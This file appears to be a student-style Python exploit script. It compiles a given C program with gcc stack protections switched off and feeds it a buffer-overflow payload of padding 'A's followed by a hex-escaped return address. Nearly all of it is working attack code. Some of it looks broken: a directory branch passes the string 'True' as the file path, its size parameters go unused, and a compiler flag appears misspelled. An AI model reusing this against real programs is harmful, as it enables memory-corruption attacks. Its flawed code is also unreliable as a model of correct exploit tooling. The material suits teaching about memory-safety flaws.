import os
import subprocess
import sys

TARGET_DIR_0 = "\x79\x51\x55\x55\x55\x55"
TARGET_DIR_1 = "\x79\x51\x55\x55\x55\x55"

def err_msg(msg: str) -> None:
    print(msg)
    sys.exit(1)

def generate_exploit_str(target_dir: str, buff_size=16, offset=8) -> str:
    print('A' * (buff_size + offset) + target_dir)
    return 'A' * (buff_size + offset) + target_dir

def compile_insecure(path: str) -> None:
    print(f"Compilando archivo: {path}")
    try:
        os.system(f"gcc -fno-stack-protector -z executestack {path} -o a.out")
    except:
        err_msg("Error compilando")

def exploit(path: str, target_dir: str,
            buff_size: int, offset: int) -> None:
    print(2)
    compile_insecure(path)
    ex_str = generate_exploit_str(target_dir)
    print(3)
    try:
        #os.system(f"./a.out <<< {ex_str}")
        p = subprocess.Popen(['./a.out'], stdin=subprocess.PIPE)
        p.communicate(ex_str.encode())
    except:
        err_msg("Error ejecutando exploit")

def process_dir(path: str):
    if target := os.path.basename(path) != '':
        exploit(str(target), TARGET_DIR_0, 16, 8)
    else:
        err_msg("El archivo no existe")

if __name__ == "__main__":
    if len(sys.argv) <= 1:
        err_msg("Insuficientes argumentos")


    if (target := sys.argv[1]) is not None:
        if os.path.isfile(target):
            print("1")
            exploit(target, TARGET_DIR_0, 16, 8)
        else:
            process_dir(target)
